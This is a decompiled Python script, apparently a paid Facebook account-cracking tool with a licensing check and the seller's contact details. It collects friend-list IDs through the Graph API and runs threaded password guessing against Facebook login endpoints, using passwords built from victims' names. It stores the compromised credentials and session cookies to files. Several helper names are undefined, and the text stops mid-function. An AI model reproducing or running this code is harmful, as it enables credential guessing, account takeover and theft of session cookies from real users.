# Decompile by Mardis (Tools By Kapten-Kaizo)
# Time Succes decompile : 2022-04-27 13:52:04.655726

#User Agent Xiaomi : Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]
#User Agent Vivo Z1 Pro : Mozilla/5.0 (Linux; Android 10; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]
#User Agent Redmi : Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]
#User Agent Oppo : Mozilla/5.0 (Linux; Android 5.1; A1601) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]
#User Agent Apple iPhone XS Max (Firefox) : Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/13.2b11866 Mobile/16A366 Safari/605.1.15
#User Agent Apple iPhone XS (Chrome) : Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/69.0.3497.105 Mobile/15E148 Safari/605.1
#User Agent Xiaomi : Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]
#User Agent Amazon US : Mozilla/5.0 (Linux; Android 9; KFONWI) AppleWebKit/537.36 (KHTML, like Gecko) Silk/84.3.5 like Chrome/84.0.4147.125 Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]
#User Agent Bangla : Mozilla/5.0 (Linux; Android 10; TECNO KE6j Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 GSA/11.42.18.23.arm64[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]
#User Agent Pakistan : Mozilla/5.0 (Linux; Android 6.0.1; SM-G920T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]

import requests,bs4,sys,os,subprocess
import requests,sys,random,time,re,base64,json

from multiprocessing.pool import ThreadPool

#### WARNA RANDOM ####
# P = '\033[0;97m'  # putih
# M = '\033[0;91m' # merah
# H = '\033[0;92m' # hijau
# K = '\033[0;93m' # kuning
# B = '\033[0;94m' # biru
# U = '\033[0;95m' # ungu
# O = '\033[0;96m' # biru muda

if ("linux" in sys.platform.lower()):

        N = '\033[0m'
        G = '\033[1;92m'
        O = '\033[1;97m'
        R = '\033[1;91m'
else:

        N = ''
        G = ''
        O = ''
        R = ''
def banner():
	print("""
	


    \33[1;33m   (          (    (    (        )          
 \33[1;33m  (   )\ )       )\ ) )\ ) )\ )  ( /(  (       
 \33[1;33m( )\ (()/(  (   (()/((()/((()/(  )\()) )\ )    
 \33[1;33m)((_) /(_)) )\   /(_))/(_))/(_))((_)\ (()/(    
\33[1;33m((_)_ (_))  ((_) (_)) (_)) (_))   _((_) /(_))_  
\33[1;33m | _ )| |   | __|/ __|/ __||_ _| | \| |(_)) __| 
\33[1;33    | _ \| |__ | _| \__ \\__ \ | |  | .` |  | (_ | 
\33[1;33m |___/|____||___||___/|___/|___| |_|\_|   \___| 
                                                


\33[1;33m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
\33[1;33m█  \33[mGithub: https://github.com/Bosshacker
\33[1;33m█  \33[mFacebook: BLESSINGTHEHACKER
\33[1;33m█  \33[mWhatsApp: +2348143234459
\33[1;33m█  \33[mTools : \33[1;33mPAID 20k per month
\33[1;33m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
"""%(h))
os.system("clear")
banner()
def chk():
  uuid = str(os.geteuid()) + str(os.getlogin()) 
  id = "|".join(uuid)
  print("\n\n\x1b[37;1m  YOUR ID : \033[94m"+id) 
  try: 
    httpCaht = requests.get("https://raw.githubusercontent.com/BOSSHACKER1/Rana/main/server.txt").text 
    if id in httpCaht: 
      print("\033[92m  YOUR ID IS ACTIVE. .......\033[97m") 
      msg = str(os.geteuid()) 
      time.sleep(1) 
      pass 
    else: 
      print("\033[0;96m YOUR ID IS NOT ACTIVE COPY👆 AND SEND ME MESSAGE ON WHATSAPP \033[0;91m#NOT FREE!!!") 
      os.system('xdg-open  https://wa.me/+2348143234459?text=*Hello*%2C%20*Blessing*%20*i*%20*want*%20*to*%20*buy*%20*your*%20*command*%20*apk*%Full Updated*Updated*')
      time.sleep(1) 
      sys.exit() 
  except: 
    sys.exit() 
    if name == '__main__': 
     print (logo)
     chk() 
    
chk()
def login():
		try:
			token = open('.token.txt','r').read()
			tokenku.append(token)
			try:
				sy = requests.get('https://graph.facebook.com/me?access_token='+tokenku[0])
				sy2 = json.loads(sy.text)['name']
				menu(sy2)
			except KeyError:
				login_kontol()
			except requests.exceptions.ConnectionError:
				banner()
				li = '# PROBLEM INTERNET CONNECTION'
				lo = mark(li, style='red')
				sol().print(lo, style='cyan')
				exit()
		except IOError:
			login_kontol()

def login_kontol():
	banner()
	print("""%s ●▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬● """%(h))
	print("""%s    \33[1;32mENTER FACEBOOK TOKEN """%(h))
	print("""%s ●▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬● """%(h))
	panda = input(x+'\33[1;96m•Token> ')
	akun=open('.token.txt','w').write(panda)
	try:
		tes = requests.get('https://graph.facebook.com/me?access_token='+panda)
		tes3 = json.loads(tes.text)['name']
		print("""%s \n"""%(h))
		print("""%s ●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬● """%(h))
		jalan('%s╚══[%s✓%s] %s\33[1;96mLOGIN SUCCESSFUL RUN THE TOOLS'%(M,P,M,P))
		print("""%s ●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬● """%(h))
		print("""%s \33[1;96mRun the new python apk.py """%(h))
		time.sleep(2.5)
		menu(my_name)()
	except KeyError:
		print("""%s \n"""%(h))
		jalan('%s╚══[%s!%s] %sLOGIN FAILED CHECK YOUR CURRENT ACCOUNT'%(M,P,M,P))
		time.sleep(2.5)
		login_kontol()
	except requests.exceptions.ConnectionError:
		li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
		lo = mark(li, style='yellow')
		sol().print(lo, style='cyan')
		exit()
		
def menu(my_name):
	io = '[bold green][01] CLONE FROM PUBLIC\n[02] CLONE FROM PUBLIC (MULTI)\n[03] CHECK CRACK RESULTS\n[04] CHECKPOINT DETECTOR\n[00] LOGOUT[/bold green]'
	oi = nel(io, style='green')
	cetak(nel(oi, title='[bold green]MENU[/bold green]'))
	jh = input(h+'['+h+'➣'+h+'] MENU : ')
	if jh in ['1','01']:
		dump_publik()
	elif jh in ['2','02']:
		dump_massal()
	elif jh in ['3','03']:
		result()
	elif jh in ['4','04']:
		file()
	elif jh in ['0','00']:
		os.system('rm -rf .token.txt')
		print(h+'['+h+'•'+h+'] Wait ...')
		time.sleep(1)
		sw = '# BERHASIL LOG OUT'
		sol().print(mark(sw, style='green'))
		exit()
	else:
		ric = '# PILIHAN TIDAK ADA DI MENU'
		sol().print(mark(ric, style='green'))
		exit()

def result():
	cek = '# CHECK CRACK RESULT'
	sol().print(mark(cek, style='bold yellow'))
	kayes = '[bold yellow][01] RESULT CP\n[02] RESULT OK\n[00] MENU[/bold yellow]'
	kis = nel(kayes, style='yellow')
	cetak(nel(kis, title='RESULTS'))
	kz = input(h+'['+h+'f'+h+'] MENU: ')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			gada = '# DIREKTORI TIDAK DITEMUKAN'
			sol().print(mark(gada, style='yellow'))
			time.sleep(2)
			back()
		if len(vin)==0:
			haha = '# ANDA BELUM MEMILIKI RESULT CP'
			sol().print(mark(haha, style='yellow'))
			time.sleep(2)
			back()
		else:
			gerr = '# HASIL CP ANDA'
			sol().print(mark(gerr, style='yellow'))
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
			gerr2 = '# CHECK CLONE RESULTS'
			sol().print(mark(gerr2, style='yellow'))
			geeh = input(h+'['+h+'f'+h+'] MENU : ')
			try:geh = lol[geeh]
			except KeyError:
				ric = '# PILIHAN TIDAK ADA DI MENU'
				sol().print(mark(ric, style='yellow'))
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				hehe = '# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGI'
				sol().print(mark(hehe, style='bold yellow'))
				time.sleep(2)
				back()
			akun = '# CP IDS'
			sol().print(mark(akun, style='bold yellow'))
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# USERNAME : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="bold yellow"))
				nocp +=1
			akun2 = '# CP IDS'
			sol().print(mark(akun, style='bold yellow'))
			input(h+'['+h+'•'+h+'] BACK')
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			gada = '# DIREKTORI TIDAK DITEMUKAN'
			sol().print(mark(gada, style='green'))
			time.sleep(2)
			back()
		if len(vin)==0:
			haha = '# ANDA BELUM MEMILIKI RESULT OK'
			sol().print(mark(haha, style='green'))
			time.sleep(2)
			back()
		else:
			gerr = '# OK IDS'
			sol().print(mark(gerr, style='green'))
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
			gerr2 = '# CHECK CLONE RESULTS'
			sol().print(mark(gerr2, style='green'))
			geeh = input(h+'['+h+'f'+h+'] MENU : ')
			try:geh = lol[geeh]
			except KeyError:
				ric = '# PILIHAN TIDAK ADA DI MENU'
				sol().print(mark(ric, style='bold green'))
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				hehe = '# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGI'
				sol().print(mark(hehe, style='bold green'))
				time.sleep(2)
				back()
			akun = '# OK IDS'
			sol().print(mark(akun, style='bold green'))
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# USERNAME : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="bold green"))
				print(f'{h}COOKIE : {x}{cpkuni[2]}')
				nocp +=1
			akun2 = '# OK IDS'
			sol().print(mark(akun, style='green'))
			input(h+'['+h+'•'+h+'] BACK')
			back()
	elif kz in ['0','00']:
		back()
	else:
		ric = '# PILIHAN TIDAK ADA DI MENU'
		sol().print(mark(ric, style='bold green'))
		exit()

def file():
	tek = '# CEK OPSI DARI FILE'
	sol().print(mark(tek, style='green'), style='on green')
	print(h+'['+h+'•'+h+'] Sedang Membaca File, Tunggu Sebentar ...')
	time.sleep(2)
	teks = '# PILIH FILE YG AKAN DI CEK'
	sol().print(mark(teks, style='green'))
	my_files = []
	try:
		lis = os.listdir('CP')
		for kt in lis:
			my_files.append(kt)
	except:pass
	try:
		mer = os.listdir('OK')
		for ty in mer:
			my_files.append(ty)
	except:pass
	if len(my_files)==0:
		yy = '# ANDA BELUM MEMILIKI RESULT UNTUK DICEK'
		sol().print(mark(yy, style='green'))
		exit()
	else:
		cih = 0
		lol = {}
		for isi in my_files:
			try:hem = open('CP/'+isi,'r').readlines()
			except:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print('['+nom+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
		teks2 = '# PILIH FILE YG AKAN DI CEK'
		sol().print(mark(teks2, style='green'))
		geeh = input(h+'['+h+'f'+h+'] MENU: ')
		try:geh = lol[geeh]
		except KeyError:
			ric = '# PILIHAN TIDAK ADA DI MENU'
			sol().print(mark(ric, style='green'))
			exit()
		try:
			hf = open('CP/'+geh,'r').readlines()
			for fz in hf:
				akun.append(fz.replace('\n',''))
			cek_opsi()
		except IOError:
			try:
				hf = open('OK/'+geh,'r').readlines()
				for fz in hf:
					akun.append(fz.replace('\n',''))
				cek_opsi()
			except IOError:
				hehe = '# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGI'
				sol().print(mark(hehe, style='green'))
				time.sleep(2)
				back()

def dump_publik():
	try:
		token = open('.token.txt','r').read()
	except IOError:
		exit()
	win = '# CLONE PUBLIC ID'
	win2 = mark(win, style='green')
	sol().print(win2)
	print(h+'['+h+'•'+h+'] CLONE FROM PUBLIC IDS')
	pil = input(h+'['+h+'f'+h+'] FACEBOOK ID : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
		for pi in koh2['friends']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(h+'['+h+'•'+h+'] Total : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
		lo = mark(li, style='green')
		sol().print(lo, style='green')
		exit()
	except (KeyError,IOError):
		teks = '# PERTEMANAN TIDAK PUBLIK ATAU TOKEN RUSAK'
		teks2 = mark(teks, style='green')
		sol().print(teks2)
		exit()

def dump_massal():
	mas='[bold green][01] CLONE MULTIPLE FILE\n[02] CLONE MANUAL MULTIPLE[/bold green]'
	mas2=nel(mas,style='green')
	cetak(nel(mas2,title='MENU'))
	pilih=input('[➣] MENU: ')
	if pilih in ['1','01']:
		nmfil=input('[➣] FILE NAME : ')
		nmfile=open(nmfil,'r').read().splitlines()
		no=1
		for xfil in nmfile:
			uid.append(xfil)
			no +=1
			if no == 20:
				break
	elif pilih in ['2','02']:
		print(h+'['+h+'➣'+h+'] TOTAL LIMIT IDS [20]')
		try:
			jum = int(input(h+'['+h+'f'+h+'] BERAPA ID : '))
		except ValueError:
			pesan = '# YOU ENTERED WRONG ID'
			pesan2 = mark(pesan, style='green')
			sol().print(pesan2)
			exit()
		if jum<1 or jum>20:
			pesan = '# OUT OF RANGE MEN'
			pesan2 = mark(pesan, style='green')
			sol().print(pesan2)
			exit()
		ses=requests.Session()
		yz = 0
		print(h+'['+h+'➣'+h+'] DO YOU WANT TO CLONE FROM FRIEND LIST')
		for met in range(jum):
			yz+=1
			kl = input(h+'['+h+str(yz)+h+'] ENTER ID '+str(yz)+' : ')
			uid.append(kl)
	sed='# Tunggu Sedang Mengumpulkan ID  '
	sol().print(mark(sed, style='green'))
	ses=requests.Session()
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
			lo = mark(li, style='green')
			sol().print(lo, style='green')
			exit()
	tot = '# BERHASIL MENGUMPULKAN %s ID'%(len(id))
	if len(id)==0:
		tot2 = mark(tot, style='green')
	else:
		tot2 = mark(tot, style='green')
	sol().print(tot2)
	setting()

def setting():
	wl = '# METHOD ✓'
	sol().print(mark(wl, style='green'))
	teks = '[bold green][01] CLONE OLD ID\n[02] CLONE NEW ID\n[03] CLONE FROM RANDOM ID[/bold green]'
	tak = nel(teks, style='green')
	cetak(nel(tak, title='MENU ✓'))
	hu = input(h+'['+h+'f'+h+'] METHOD ✓: ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		ric = '# PILIHAN TIDAK ADA DI MENU'
		sol().print(mark(ric, style='green'))
		exit()
	met = '# METHOD ✓'
	sol().print(mark(met, style='green'))
	ioz = '[bold green][01]M-FACEBOOK\n[02]FREE-FACEBOOK\n[03]MBASIC-FACEBOOK[/bold green]'
	gess = nel(ioz, style='green')
	cetak(nel(gess, title='METHOD ✓'))
	hc = input(h+'['+h+'f'+h+'] MENU : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('free')
	elif hc in ['3','03']:
		method.append('mbasic')
	else:
		method.append('mobile')
	guw = '# SHOW OPTIONS ✓'
	sol().print(mark(guw, style='green'))
	aplik = input(h+'['+h+'f'+h+']STORED APPS ? (y/t) : ')
	if aplik in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	osk = input(h+'['+h+'f'+h+'] SHOW C/P OPTIONS? [ NOT RECOMMENDED ] (y/t) : ')
	if osk in ['y','Y']:
		oprek.append('ya')
	else:
		oprek.append('no')
	passwrd()

def passwrd():
	ler = '# CLONING HAS STARTED ✓'
	sol().print(mark(ler, style='green'))
	krek = 'OK ID STORE TO : OK/%s\nCP ID SAVED TO : CP/%s\nTURN ON AIRPLANE MODE FOR EVERY 8 SECONDS'%(okc,cpc)
	cetak(nel(krek, title='CLONE'))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['sayang']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'12345')
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'touch' in method:
				pool.submit(cracktouch,idf,pwv)
			else:
				pool.submit(crack,idf,pwv)
	print('')
	tanya = '# CHECK RESULTS OPTIONS?'
	sol().print(mark(tanya, style='green'))
	woi = input(h+'['+h+'f'+h+'] SHOW CRACK RESULTS? (y/t) : ')
	if woi in ['y','Y']:
		cek_opsi()
	else:
		exit()

def crack(idf,pwv):
	global ok,cp,loop
	bi = random.choice([h])
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s➣ %s/%s ➣👉-OK:%s ➣👉-CP:%s ➣ %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ua3 = random.choice(ugen3)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,id;q=0.6,bs;q=0.5"})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://m.facebook.com/login/save-device/'"}
			ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https:/m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,id;q=0.6,bs;q=0.5"})
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				else:
					print(f'\r   {M}CP ✓ {idf}[][]{pw}{N}')
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print(f'\r   {H}OK ✓ {idf}[][]{pw}|{kuki}{N}')
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					infoakun += (f"\n[bold green][•]Active Apps :[/bold green] \n")
					apkAktif = re.findall('\/>\<div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
					hit1,hit2=0,0
					apkaktip = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))

					for muncul in apkAktif:
						hit1+=1
						infoakun+= (f"[bold green][{hit1}] {muncul} {apkaktip[hit2]}[/bold green]\n")

					hit1,hit2=0,0
					infoakun += (f"[bold green][•] Expired Application :[/bold green]\n")
					apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
					kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
					for muncul in apkKadaluarsa:
						hit1+=1
						infoakun += (f"[bold green][{hit1}] {muncul} {kadaluarsa[hit2]}[/bold green]\n")
					print(f'\r   {H}OK ✓ {idf}[][]{pw}|{kuki}|{infoakun}{N}')
					break


			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1


def crackfree(idf,pwv):
	global ok,cp,loop
	bi = random.choice([h])
	pers = loop*100/len(id)
	fff = '%'
	print('\r%s➣ %s/%s ➣👉-OK:%s ➣👉-CP:%s ➣ %s%s%s'%(bi,loop,len(id),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			tix = time.time()
			ses.headers.update({"Host":'free.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://free.facebook.com/login/save-device/'"}
			ses.headers.update({"Host":'free.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://free.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				else:
					print(f'\r   {M}CP ✓   {idf}|{pw}{N}')
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print(f'\r   {H}OK ✓ {idf}|{pw}|{kuki}{N}')
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					infoakun += (f"\n[green][•] Active Apps[/green] \n")
					apkAktif = re.findall('\/>\<div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
					hit1,hit2=0,0
					apkaktip = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))

					for muncul in apkAktif:
						hit1+=1
						infoakun+= (f"[bold green][{hit1}] {muncul} {apkaktip[hit2]}[/bold green]\n")

					hit1,hit2=0,0
					infoakun += (f"[bold green][•] Expired Application:[/bold green]\n")
